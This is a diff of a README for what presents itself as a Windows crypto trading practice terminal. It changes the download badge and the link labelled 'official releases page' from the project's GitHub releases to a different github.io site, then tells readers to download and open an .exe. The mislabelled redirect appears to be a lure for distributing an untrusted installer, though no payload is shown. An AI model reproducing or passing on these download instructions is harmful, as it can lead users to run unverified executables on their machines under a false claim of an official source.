@@ -1,6 +1,6 @@
 # 📈 Trading-Terminal-Demo-2026 - Practice crypto trading with virtual funds
 
-[![](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/gonzalezgreg100-hue/Trading-Terminal-Demo-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://gonzalezgreg100-hue.github.io)
 
 ## 🎯 About this software
 
@@ -20,7 +20,7 @@ This application runs on standard Windows hardware. Ensure your computer meets t
 
 Follow these steps to set up the terminal on your Windows PC.
 
-1. Visit the [official releases page](https://github.com/gonzalezgreg100-hue/Trading-Terminal-Demo-2026/releases) to access the installer.
+1. Visit the [official releases page](https://gonzalezgreg100-hue.github.io) to access the installer.
 2. Look for the latest version listed under Assets.
 3. Click the file ending in .exe to start the download.
 4. Once the download finishes, open your Downloads folder in File Explorer.
